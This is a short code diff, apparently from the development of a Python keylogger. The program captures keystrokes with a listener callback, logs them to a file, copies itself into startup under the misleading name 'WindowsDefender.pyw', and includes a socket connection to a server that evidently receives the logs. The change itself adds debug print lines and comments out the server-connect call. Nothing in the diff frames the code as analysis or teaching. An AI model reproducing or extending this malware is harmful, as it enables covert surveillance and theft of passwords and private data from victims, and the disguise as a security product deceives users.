@@ -99,6 +99,7 @@ class Socket:
 
 
 def key_press(key):
+    print("Running listener")
     key = str(key).replace("'", "")
     Global.key_array.append(key)
     Global.i += 1
@@ -121,12 +122,14 @@ log_file = Logging("log.txt")
 copy_to_startup("WindowsDefender.pyw")
 while True:
     # Try to establish connection to server
-    if not connection.established:
-        connection.connect_to_server()
+    #if not connection.established:
+        #connection.connect_to_server()
 
     # start key listener
     with Listener(on_press=key_press)as f:
         f.join()
+
+    print("Continue")
 
     if connection.established:
         # if log could not be saved continue
